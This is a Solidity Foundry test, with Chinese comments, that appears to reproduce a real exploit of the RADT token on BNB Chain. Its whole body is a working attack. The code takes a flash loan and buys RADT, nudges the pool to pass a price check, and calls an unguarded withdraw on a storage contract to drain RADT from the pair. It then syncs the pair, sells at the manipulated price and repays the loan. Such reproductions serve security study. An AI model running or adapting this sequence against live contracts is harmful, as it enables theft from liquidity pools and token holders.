pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract ContractTest is Test {

    // 代币
    IERC20 BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 RADT = IERC20(0xDC8Cb92AA6FC7277E3EC32e3f00ad7b8437AE883);
    // 池子：手动更新池子价格
    IUni_Pair_V2 pair = IUni_Pair_V2(0xaF8fb60f310DCd8E488e4fa10C48907B7abf115e);
    // 存储合约，用来调用withdraw
    IStorageContract storageContract = IStorageContract(0x01112eA0679110cbc0ddeA567b51ec36825aeF9b);
    // 闪电贷
    address getFlashloan = 0xDa26Dd3c1B917Fbf733226e9e71189ABb4919E3f;
    // router：用于swap
    IUni_Router_V2 Router = IUni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint256 public constant FLASHLOAN_AMOUNT = 243673213068049612594655;

    function setUp() public {
        vm.createSelectFork("bsc", 21_572_418);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[before] Attacker BSC_USD balance", BSC_USD.balanceOf(address(this)), 18);

        // 为两次swap做准备
        BSC_USD.approve(address(Router), ~uint256(0));
        RADT.approve(address(Router), ~uint256(0));

        IGetFlashloan(getFlashloan).flashLoan(0, FLASHLOAN_AMOUNT, address(this), new bytes(1));

        emit log_named_decimal_uint("[after pay back flashloan] Attacker BSC_USD balance", BSC_USD.balanceOf(address(this)), 18);
    }

    // 闪电贷回调
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        emit log_named_decimal_uint("[get flashloan] Attacker BSC_USD balance", BSC_USD.balanceOf(address(this)), 18);

        // 价格操纵前买入RADT
        buyRADT();

        // 不写会报[FAIL. Reason: the price of coin is low],这是在withdraw取款的时候报错
        // 给池子发送1个BSC-USD，抬高一点RADT代币的价格，使得withdraw满足条件可以调用
        BSC_USD.transfer(address(pair), 1);
        
        uint256 amount = 89806000000000000000000;

        // 操纵价格
        storageContract.withdraw(address(0x68Dbf1c787e3f4C85bF3a0fd1D18418eFb1fb0BE), address(pair), amount);
        pair.sync();

        // 价格操纵后卖出RADT
        sellRADT();

        emit log_named_decimal_uint("[after attack] Attacker BSC_USD balance", BSC_USD.balanceOf(address(this)), 18);

        // 闪电贷还款
        BSC_USD.transfer(address(getFlashloan), FLASHLOAN_AMOUNT);
    }

    function buyRADT() public {
        address[] memory path = new address[](2);
        path[0] = address(BSC_USD);
        path[1] = address(RADT);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            1000 * 1e18, 0, path, address(this), ~uint256(0)
        );
    }

    function sellRADT() public {
        address[] memory path = new address[](2);
        path[0] = address(RADT);
        path[1] = address(BSC_USD);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            RADT.balanceOf(address(this)), 0, path, address(this),~uint256(0)
        );
    }
}